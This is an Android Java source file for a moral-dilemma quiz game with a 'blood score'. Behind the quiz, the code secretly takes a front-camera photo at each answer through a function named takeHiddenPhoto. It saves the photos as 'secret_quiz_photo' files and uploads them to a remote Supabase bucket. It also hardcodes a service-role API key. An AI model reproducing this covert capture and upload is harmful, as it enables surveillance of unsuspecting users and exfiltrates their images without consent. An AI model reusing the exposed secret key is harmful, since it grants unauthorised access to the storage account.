package com.example.quiznasserollahapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class QuizActivity extends AppCompatActivity {

    private static final int IMAGE_CAPTURE_CODE = 1001;
    private ProgressBar progressBlood;
    private int pictureCount = 0;
    private File firstImage, secondImage, currentImageFile;
    private TextView tvQuiz, tvBloodScore;
    private Button btnNext;
    private RadioGroup radioGroup;
    private RadioButton radioMother, radioWife, radioNotSay;
    private int bloodScore;
    private int currentQuestion = 1;
    private boolean takingPhoto = false;

    private boolean isImageUploaded = false;
    private String uploadedImageName = "";

    // Camera2 API variables
    private CameraDevice cameraDevice;
    private Handler backgroundHandler;
    private ImageReader imageReader;
    private CameraCaptureSession captureSession;
    private CameraManager cameraManager;
    private String cameraId;

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_quiz);

        tvQuiz = findViewById(R.id.tvQuiz);
        tvBloodScore = findViewById(R.id.tvBloodScore);
        btnNext = findViewById(R.id.btnNext);
        radioGroup = findViewById(R.id.radioGroup);
        radioMother = findViewById(R.id.radioMother);
        radioWife = findViewById(R.id.radioWife);
        radioNotSay = findViewById(R.id.radioNotSay);
        progressBlood = findViewById(R.id.progressBlood);

        bloodScore = getIntent().getIntExtra("bloodScore", 500);
        tvBloodScore.setText("Blood Score: " + bloodScore);
        progressBlood.setMax(500);
        progressBlood.setProgress(bloodScore);

        showQuestion();

        startBackgroundThread();
        initCamera2();

        btnNext.setOnClickListener(v -> {
            if (takingPhoto) return;

            int selectedId = radioGroup.getCheckedRadioButtonId();
            if (selectedId == -1) {
                tvQuiz.setText("Please select an option to continue.");
                return;
            }

            RadioButton selectedRadio = findViewById(selectedId);
            String selectedOption = selectedRadio.getText().toString();

            // Call the photo capture for each question
            takeHiddenPhoto();
            if (currentQuestion == 1 && selectedOption.equals("Wife")) {
                bloodScore -= 50;

            } else if (currentQuestion == 2 && selectedOption.equals("Take the wallet to the police.")) {
                bloodScore -= 50;

            } else if (currentQuestion == 3 && selectedOption.equals("Ask for help from a local or embassy.")) {
                bloodScore -= 50;

            } else if (currentQuestion == 4 && selectedOption.equals("Run to the nearest building for shelter.")) {
                bloodScore -= 50;

            } else if (currentQuestion == 5 && selectedOption.equals("Remain calm, press the emergency button, and wait for help.")) {
                bloodScore -= 50;

            } else if (currentQuestion == 6 && selectedOption.equals("Alert the authorities and evacuate the area calmly.")) {
                bloodScore -= 50;

            } else if (currentQuestion == 7 && selectedOption.equals("An elderly person")) {
                bloodScore -= 50;
            }
            tvBloodScore.setText("Blood Score: " + bloodScore);
            progressBlood.setProgress(bloodScore);

            if (currentQuestion == 7) {
                if (firstImage != null && secondImage != null) {
                    Toast.makeText(this, "Comparing faces...", Toast.LENGTH_SHORT).show();
                }

                Intent intent;
                if (bloodScore < 300) {
                    intent = new Intent(QuizActivity.this, DefeatActivity.class);
                } else if (bloodScore == 500) {
                    intent = new Intent(QuizActivity.this, KingOfVillageActivity.class);
                } else {
                    intent = new Intent(QuizActivity.this, YouAreAliveActivity.class);
                }
                intent.putExtra("finalBloodScore", bloodScore);
                startActivity(intent);
                finish();
            } else {
                currentQuestion++;
                showQuestion();
            }
        });
    }

    private void showQuestion() {
        switch (currentQuestion) {
            case 1:
                tvQuiz.setText("Question 1: If you're in a hard situation, would you save one person? Your mother or your wife?");
                radioMother.setText("Mother");
                radioWife.setText("Wife");
                radioNotSay.setText("I prefer not to say");
                break;
            case 2:
                tvQuiz.setText("Question 2: You find a wallet on the street with a large amount of money. What do you do?");
                radioMother.setText("Take the money and leave the wallet.");
                radioWife.setText("Leave the wallet where you found it");
                radioNotSay.setText("Take the wallet to the police.");
                break;
            case 3:
                tvQuiz.setText("Question 3: You are stuck in a foreign country without money and have limited food and water. How do you survive?");
                radioMother.setText("Ask for help from a local or embassy.");
                radioWife.setText("Try to survive alone without seeking help");
                radioNotSay.setText("Steal food from a local market.");
                break;
            case 4:
                tvQuiz.setText("Question 4: You are being chased by a wild animal. What do you do?");
                radioMother.setText("Run to the nearest building for shelter.");
                radioWife.setText("Stay still and hope it leaves you alone.");
                radioNotSay.setText("Try to scare it away by yelling loudly");
                break;
            case 5:
                tvQuiz.setText("Question 5: You are stuck in an elevator and the power goes out. What do you do?");
                radioMother.setText("Panic and try to force the door open.");
                radioWife.setText("Remain calm, press the emergency button, and wait for help.");
                radioNotSay.setText("Call someone on the phone to tell them where you are.");
                break;
            case 6:
                tvQuiz.setText("Question 6: You are at a crowded event and someone starts a fire. What do you do first?");
                radioMother.setText("Alert the authorities and evacuate the area calmly.");
                radioWife.setText("Try to put out the fire on your own.");
                radioNotSay.setText("Panic and run in any direction to escape.");
                break;
            case 7:
                tvQuiz.setText("Question 7: You are on a sinking boat. The life raft is small, and there is only room for one more person. Who do you choose to save?");
                radioMother.setText("A child");
                radioWife.setText("An elderly person");
                radioNotSay.setText("A stranger you don’t know");
                break;
        }
        radioGroup.clearCheck();
    }

    private void startBackgroundThread() {
        HandlerThread handlerThread = new HandlerThread("CameraBackground");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
    }

    private void initCamera2() {
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id;
                    break;
                }
            }

            Size[] jpegSizes = cameraManager.getCameraCharacteristics(cameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.JPEG);
            int width = 640;
            int height = 480;
            if (jpegSizes != null && jpegSizes.length > 0) {
                width = jpegSizes[0].getWidth();
                height = jpegSizes[0].getHeight();
            }

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireNextImage();
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                saveImageToFile(bytes);
                image.close();
            }, backgroundHandler);

        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void takeHiddenPhoto() {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1);
                return;
            }

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(imageReader.getSurface());
                        cameraDevice.createCaptureSession(
                                java.util.Collections.singletonList(imageReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
                                                    super.onCaptureCompleted(session, request, result);
                                                    cameraDevice.close();
                                                }
                                            }, backgroundHandler);
                                        } catch (CameraAccessException e) {
                                            e.printStackTrace();
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {}
                                }, backgroundHandler);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                }
            }, backgroundHandler);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void saveImageToFile(byte[] bytes) {
        try {
            File imageFile = createImageFile();
            FileOutputStream fos = new FileOutputStream(imageFile);
            fos.write(bytes);
            fos.close();
            runOnUiThread(() -> Toast.makeText(this, "Hidden photo saved", Toast.LENGTH_SHORT).show());

            if (pictureCount == 0) firstImage = imageFile;
            else if (pictureCount == 1) secondImage = imageFile;
            pictureCount++;

            uploadImageToSupabase(imageFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private File createImageFile() throws IOException {
        String fileName = "secret_quiz_photo_" + System.currentTimeMillis();
        File storageDir = new File(getExternalFilesDir(null), "quizphotos");
        if (!storageDir.exists()) {
            storageDir.mkdirs();
        }
        return File.createTempFile(fileName, ".jpg", storageDir);
    }

    private void uploadImageToSupabase(File imageFile) {
        OkHttpClient client = new OkHttpClient();
        String supabaseUrl = "https://nzfiiozondmzvdqxdrld.supabase.co";
        String bucketName = "images";
        String apiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im56Zmlpb3pvbmRtenZkcXhkcmxkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTE0MjIxNywiZXhwIjoyMDYwNzE4MjE3fQ.2d0GZGpYADZ985xNUpxWh3i7pHHun1WxkXn4QhX4g9A"; // Replace with your actual API Key
        String objectPath = "photos2/" + imageFile.getName();

        RequestBody requestBody = RequestBody.create(imageFile, MediaType.parse("image/jpeg"));
        Request request = new Request.Builder()
                .url(supabaseUrl + "/storage/v1/object/" + bucketName + "/" + objectPath)
                .addHeader("apikey", apiKey)
                .addHeader("Authorization", "Bearer " + apiKey)
                .addHeader("Content-Type", "image/jpeg")
                .put(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(QuizActivity.this, "Upload error", Toast.LENGTH_SHORT).show());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String responseBody = response.body().string();
                Log.d("SUPABASE_UPLOAD", "Response Code: " + response.code() + " Body: " + responseBody);

                if (response.isSuccessful()) {
                    isImageUploaded = true;
                    uploadedImageName = imageFile.getName();
                    runOnUiThread(() -> Toast.makeText(QuizActivity.this, "Image uploaded", Toast.LENGTH_SHORT).show());
                } else {
                    runOnUiThread(() -> Toast.makeText(QuizActivity.this, "Upload failed: " + responseBody, Toast.LENGTH_LONG).show());
                }
            }
        });
    }
}
